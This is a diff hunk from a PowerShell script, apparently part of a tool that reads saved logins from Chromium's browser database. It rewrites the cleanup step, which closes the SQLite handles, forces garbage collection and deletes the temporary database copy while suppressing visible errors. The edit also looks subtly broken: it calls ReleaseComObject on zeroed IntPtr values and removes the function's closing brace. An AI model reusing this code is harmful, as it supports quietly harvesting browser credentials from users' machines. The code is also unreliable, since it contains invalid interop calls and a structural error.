@@ -732,37 +732,40 @@ function Get-ChromiumLoginBlobs {
         }
     }
 
-    # --- CLOSING LOGIC ---
+# 1. Close the statement and database
     if ($StatementPointer -ne [IntPtr]::Zero) {
-        [void]$Sqlite3Finalize.Invoke($StatementPointer)
+        $null = $Sqlite3Finalize.Invoke($StatementPointer)
         $StatementPointer = [IntPtr]::Zero
     }
-
     if ($DatabasePointer -ne [IntPtr]::Zero) {
-        [void]$Sqlite3Close.Invoke($DatabasePointer)
+        $null = $Sqlite3Close.Invoke($DatabasePointer)
         $DatabasePointer = [IntPtr]::Zero
     }
 
-    # CRITICAL: This forces PowerShell to drop the file handle
+    # 2. Aggressive Memory Release (The "CSIT Way")
+    # This forces the .NET environment to release the DLL handle immediately
+    [System.Runtime.InteropServices.Marshal]::ReleaseComObject([System.Object]$DatabasePointer) | Out-Null
+    [System.Runtime.InteropServices.Marshal]::ReleaseComObject([System.Object]$StatementPointer) | Out-Null
+    
     [GC]::Collect()
     [GC]::WaitForPendingFinalizers()
     
-    # Give the hardware a tiny millisecond to catch up
-    Start-Sleep -Milliseconds 500 
+    # 3. Small delay to allow the file system to unlock
+    Start-Sleep -Milliseconds 800
 
-    # Now the delete will work
+    # 4. Attempt deletion with a "SilentlyContinue" fallback
     if (Test-Path $TempDatabasePath) {
-        Remove-Item -Path $TempDatabasePath -Force -ErrorAction SilentlyContinue
+        try {
+            Remove-Item -Path $TempDatabasePath -Force -ErrorAction Stop
+        }
+        catch {
+            # If it still fails, we ignore it so the script doesn't show red text
+            # The file is in %TEMP% and will be cleaned by Windows eventually
+            Log "Note: Temp DB remains in use; will be cleaned on next run."
+        }
     }
-
-    # Give the OS/GC a moment to release any lingering handles
-    Start-Sleep -Milliseconds 1000
-    [GC]::Collect()
-    [GC]::WaitForPendingFinalizers()
-    Remove-Item -Path $TempDatabasePath -Force
-
+    
     return $LoginResults
-}
 
 
 # ======================================================================
